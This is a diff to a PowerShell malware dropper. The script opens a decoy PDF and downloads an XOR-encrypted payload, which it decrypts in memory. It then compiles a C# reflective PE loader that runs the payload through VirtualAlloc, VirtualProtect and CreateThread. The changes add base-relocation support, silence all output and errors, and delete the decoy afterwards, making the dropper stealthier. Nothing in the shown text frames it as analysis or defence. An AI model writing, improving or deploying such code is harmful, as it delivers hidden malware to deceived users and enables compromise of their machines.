@@ -6,85 +6,100 @@ $xorKey = [System.Text.Encoding]::ASCII.GetBytes('i0xuFnZOf69X7bktf3Vs') # <-- I
 # Temp path for the decoy PDF
 $tempPdfPath = Join-Path $env:TEMP "dtecfG.pdf"
 
-# 2. Decoy Operation: Download and open the PDF
 try {
     $webClient = New-Object System.Net.WebClient
+    # This line forces TLS 1.2, a good practice to add here as well.
+    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
     $webClient.DownloadFile($decoyPdfUrl, $tempPdfPath)
     Start-Process $tempPdfPath
-    Write-Host "[+] Decoy PDF launched."
-} catch {
-    Write-Host "[-] Failed to download or launch decoy PDF."
-}
+} catch {}
 
-# 3. Payload Operation: Download and Decrypt
+# 3. Payload Operation
 try {
     $encryptedBytes = $webClient.DownloadData($payloadXorUrl)
-    
-    # Perform the XOR decryption in memory
     $decryptedPEBytes = for($i=0; $i -lt $encryptedBytes.Length; $i++) {
         $encryptedBytes[$i] -bxor $xorKey[$i % $xorKey.Length]
     }
-    Write-Host "[+] Payload downloaded and decrypted in memory."
-} catch {
-    Write-Host "[-] Failed to download or decrypt payload. Exiting."
-    exit
-}
+} catch { exit }
 
-
-# 4. Reflective PE Loader: C# code to execute a PE from a byte array
+# 4. Reflective PE Loader with Relocation Support
 $csharpPELoader = @"
 using System;
 using System.Runtime.InteropServices;
 
 public class PEExecutor {
     // Win32 API function imports
-    [DllImport("kernel32.dll")]
-    private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+    [DllImport("kernel32.dll")] private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+    [DllImport("kernel32.dll")] private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
+    [DllImport("kernel32.dll")] private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 
-    [DllImport("kernel32.dll")]
-    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
+    // Constants
+    private const uint MEM_COMMIT_RESERVE = 0x3000;
+    private const uint PAGE_EXECUTE_READWRITE = 0x40;
+    private const uint PAGE_READWRITE = 0x04;
 
-    [DllImport("kernel32.dll")]
-    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
-
-    private static UInt32 MEM_COMMIT = 0x1000;
-    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+    // PE structure offsets and directories
+    private const int OPTIONAL_HEADER_SIZE_OFFSET = 0x14;
+    private const int SYMBOL_TABLE_OFFSET = 0x08;
+    private const int NUMBER_OF_SECTIONS_OFFSET = 0x06;
+    private const int IMAGE_DIRECTORY_ENTRY_BASERELOC = 5;
 
     public static void Execute(byte[] peBytes) {
-        // Get PE headers
+        // --- PE Header Parsing ---
         int e_lfanew = BitConverter.ToInt32(peBytes, 0x3C);
+        IntPtr imageBase = new IntPtr(BitConverter.ToInt32(peBytes, e_lfanew + 0x34));
         int sizeOfImage = BitConverter.ToInt32(peBytes, e_lfanew + 0x50);
         int sizeOfHeaders = BitConverter.ToInt32(peBytes, e_lfanew + 0x54);
+        int addressOfEntryPoint = BitConverter.ToInt32(peBytes, e_lfanew + 0x28);
+        short sizeOfOptionalHeader = BitConverter.ToInt16(peBytes, e_lfanew + OPTIONAL_HEADER_SIZE_OFFSET);
+        short numberOfSections = BitConverter.ToInt16(peBytes, e_lfanew + NUMBER_OF_SECTIONS_OFFSET);
+        int firstSectionOffset = e_lfanew + SYMBOL_TABLE_OFFSET + sizeOfOptionalHeader;
 
-        // Allocate memory for the PE image
-        IntPtr baseAddress = VirtualAlloc(IntPtr.Zero, (uint)sizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+        // --- Memory Allocation ---
+        IntPtr baseAddress = VirtualAlloc(IntPtr.Zero, (uint)sizeOfImage, MEM_COMMIT_RESERVE, PAGE_READWRITE);
 
-        // Copy PE headers to the allocated memory
-        Marshal.Copy(peBytes, 0, baseAddress, sizeOfHeaders);
+        // --- Base Relocation (The Fix) ---
+        long delta = baseAddress.ToInt64() - imageBase.ToInt64();
+        if (delta != 0) {
+            int relocTableOffset = BitConverter.ToInt32(peBytes, e_lfanew + 0xA0 + (IMAGE_DIRECTORY_ENTRY_BASERELOC * 8));
+            int relocTableSize = BitConverter.ToInt32(peBytes, e_lfanew + 0xA0 + (IMAGE_DIRECTORY_ENTRY_BASERELOC * 8) + 4);
+            int currentRelocOffset = 0;
+            while (currentRelocOffset < relocTableSize) {
+                int pageRVA = BitConverter.ToInt32(peBytes, relocTableOffset + currentRelocOffset);
+                int blockSize = BitConverter.ToInt32(peBytes, relocTableOffset + currentRelocOffset + 4);
+                currentRelocOffset += 8;
+                for (int i = 0; i < (blockSize - 8) / 2; i++) {
+                    short relocInfo = BitConverter.ToInt16(peBytes, relocTableOffset + currentRelocOffset + (i * 2));
+                    int relocType = relocInfo >> 12;
+                    int patchOffset = relocInfo & 0xFFF;
+                    if (relocType == 3) { // IMAGE_REL_BASED_HIGHLOW
+                        int originalAddress = BitConverter.ToInt32(peBytes, pageRVA + patchOffset);
+                        long newAddress = originalAddress + delta;
+                        Buffer.BlockCopy(BitConverter.GetBytes(newAddress), 0, peBytes, pageRVA + patchOffset, 4);
+                    }
+                }
+                currentRelocOffset += (blockSize - 8);
+            }
+        }
 
-        // Copy PE sections to the allocated memory
-        int numberOfSections = BitConverter.ToInt16(peBytes, e_lfanew + 0x06);
-        int sizeOfOptionalHeader = BitConverter.ToInt16(peBytes, e_lfanew + 0x14);
-        int sectionOffset = e_lfanew + 0x18 + sizeOfOptionalHeader;
-
+        // --- Section Mapping ---
+        Marshal.Copy(peBytes, 0, baseAddress, sizeOfHeaders); // Copy headers
         for (int i = 0; i < numberOfSections; i++) {
+            int sectionOffset = firstSectionOffset + (i * 40);
             int virtualAddress = BitConverter.ToInt32(peBytes, sectionOffset + 0x0C);
             int sizeOfRawData = BitConverter.ToInt32(peBytes, sectionOffset + 0x10);
             int pointerToRawData = BitConverter.ToInt32(peBytes, sectionOffset + 0x14);
-            Marshal.Copy(peBytes, pointerToRawData, (IntPtr)(baseAddress.ToInt64() + virtualAddress), sizeOfRawData);
-            sectionOffset += 0x28; // Size of IMAGE_SECTION_HEADER
+            if (sizeOfRawData > 0) {
+                Marshal.Copy(peBytes, pointerToRawData, (IntPtr)(baseAddress.ToInt64() + virtualAddress), sizeOfRawData);
+            }
         }
 
-        // Get address of entry point
-        int addressOfEntryPoint = BitConverter.ToInt32(peBytes, e_lfanew + 0x28);
+        // --- Change Memory Permissions and Execute ---
+        uint oldProtect;
+        VirtualProtect(baseAddress, (UIntPtr)sizeOfImage, PAGE_EXECUTE_READWRITE, out oldProtect);
         IntPtr entryPointAddress = (IntPtr)(baseAddress.ToInt64() + addressOfEntryPoint);
-
-        // Create a thread to execute the PE
         uint threadId;
-        IntPtr hThread = CreateThread(IntPtr.Zero, 0, entryPointAddress, IntPtr.Zero, 0, out threadId);
-        
-        // Optionally wait for the thread to finish
-        // WaitForSingleObject(hThread, 0xFFFFFFFF); // INFINITE
+        CreateThread(IntPtr.Zero, 0, entryPointAddress, IntPtr.Zero, 0, out threadId);
     }
 }
 "@
@@ -92,19 +107,14 @@ public class PEExecutor {
 # 5. Compile and Run the Loader
 try {
     Add-Type -TypeDefinition $csharpPELoader
-    Write-Host "[+] In-memory PE loader compiled."
-    Write-Host "[*] Executing C payload from memory..."
     [PEExecutor]::Execute($decryptedPEBytes)
-    Write-Host "[+] Payload execution thread created."
 } catch {
-    Write-Host "[-] Failed to compile or execute the PE loader."
-    Write-Host $_
+    # If it fails, do nothing. Don't show an error.
 }
 
 # 6. Clean up the decoy PDF
 try {
-    # Give the user a moment before the PDF disappears
-    Start-Sleep -s 10
-    Stop-Process -Name "AcroRd32", "msedge" -ErrorAction SilentlyContinue # Add other PDF readers if needed
+    Start-Sleep -s 15
+    Stop-Process -Name ((Get-Item $tempPdfPath).Name -replace '\.pdf$') -ErrorAction SilentlyContinue
     Remove-Item $tempPdfPath -Force -ErrorAction SilentlyContinue
 } catch {}
